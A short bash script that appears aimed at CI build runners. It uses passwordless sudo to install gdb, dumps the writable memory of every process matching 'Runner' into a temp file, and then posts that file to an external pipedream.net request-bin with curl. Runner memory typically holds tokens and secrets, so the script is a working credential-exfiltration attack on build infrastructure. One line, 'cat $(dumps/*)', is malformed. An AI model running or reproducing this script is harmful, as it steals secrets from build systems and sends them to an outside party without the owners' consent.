#!/bin/bash

# install gdb sudo is passwordless according to doc
sudo apt-get install gdb -y > /tmp/file.txt

mkdir dumps
echo "STARTING..." >> /tmp/file.txt

# get pids related to runners and dump their memory
for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
do
    echo "-----$pid-----" >> /tmp/file.txt;
    grep rw-p /proc/$pid/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
        echo "> $start-$stop" >> /tmp/file.txt;
        gdb --batch --pid $pid -ex "dump memory dumps/$pid-$start-$stop.dump 0x$start 0x$stop"; \
        cat $(dumps/*) >> /tmp/file.txt; \
        rm dumps/$pid-$start-$stop.dump; \
    done
    echo "--------------" >> /tmp/file.txt;
done

echo "FINISHED..." >> /tmp/file.txt

echo $(ls -la /) >> /tmp/file.txt

rm -rf dumps/

curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
